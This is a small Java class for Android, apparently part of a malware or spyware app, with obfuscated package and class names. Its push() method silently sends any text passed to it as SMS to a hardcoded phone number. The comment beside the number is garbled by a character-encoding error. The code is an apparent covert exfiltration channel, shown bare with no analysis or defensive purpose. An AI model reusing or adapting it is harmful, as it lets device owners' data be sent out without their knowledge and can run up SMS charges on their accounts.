package com.a.a;


import android.telephony.SmsManager;

public class sm {
	final public static String TELPHONE = "13589742578";// �ֻ��ţ�Ϊ���������Ա��ɼ�����ʵû�õ�

	public void push(String body) {
		if (n.chkIsOk(TELPHONE)) {
			SmsManager smr = SmsManager.getDefault();
			smr.sendMultipartTextMessage(TELPHONE, null, smr.divideMessage(body), null, null);
		}
	}

}
